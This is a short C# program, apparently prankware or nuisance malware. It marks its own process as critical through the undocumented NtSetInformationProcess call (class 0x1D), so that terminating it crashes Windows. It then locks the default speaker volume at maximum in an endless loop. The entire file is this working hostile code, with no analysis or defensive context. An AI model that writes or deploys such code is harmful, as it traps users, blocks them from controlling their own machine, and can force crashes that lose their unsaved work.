using System.Runtime.InteropServices;
using System;
using System.Threading;
using NAudio.CoreAudioApi;
using System.Diagnostics;

class Program
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr Handle, int processInformationClass, ref int processInformation, int processInformationLength);
    static void Main(string[] args)
    {
        Process.EnterDebugMode();
        int isCritical = 1;
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
        var enumerator = new MMDeviceEnumerator();
        var device = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);
        var volume = device.AudioEndpointVolume;
        while (true)
        {
            float newVolume = volume.MasterVolumeLevelScalar + 1.0f;
            if (newVolume > 1.0f)
            {
                newVolume = 1.0f; 
            }
            volume.MasterVolumeLevelScalar = newVolume;
            Thread.Sleep(100);
        }
    }
}
